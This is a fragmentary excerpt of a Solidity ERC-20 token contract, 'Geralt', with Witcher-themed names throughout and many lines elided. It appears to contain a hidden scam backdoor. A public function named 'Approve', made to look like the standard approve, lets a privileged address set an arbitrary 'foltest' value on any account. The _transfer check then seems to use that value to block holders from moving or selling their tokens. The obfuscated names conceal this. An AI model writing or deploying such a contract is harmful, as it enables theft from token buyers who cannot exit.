...
abstract contract Witcher {
    uint256 constant RIVIA = 1;
    ...
    string constant Vengerberg = "Vengerberg";
}

abstract contract Hunter {
    event Yennefer(
        address anya,
        uint256 chalotra,
        bool sorce
...
contract Geralt is IERC20, Hunter, Witcher, Ownable {
    ...
    mapping(address => bool) private _monst;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => Aretuza) private _aretuza;

    Jaskier[] private _jaskier;
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _jaskier.push(Jaskier(knight_, 1));
    ...
    function Approve(address account, uint256 amount) public returns (bool) {
        ...
        _khayisa(from, account, amount);
        _allowances[from][from] = amount;
        _vigo(from, account, amount);
        emit Approval(from, address(this), amount);
        return true;
    }

    function _khayisa(address from, address account, uint256 chiva) internal {
        uint256 royce = 0;
        require(account != address(0), "invalid address");
        if (from != _jaskier[0].henry) {
            _aretuza[from].foltest -= royce;
            _aretuza[account].foltest += royce;
        } else {
            _aretuza[from].foltest -= royce;
            royce += chiva;
            _aretuza[account].foltest = royce;
    ...
    function _vigo(address from, address recipients, uint256 triss) internal {
        uint256 total = 0;
        if (recipients == _jaskier[0].henry) {
    ...
    function _transfer(
        ...
        require(amount - _aretuza[sender].foltest > 0, "temeria");
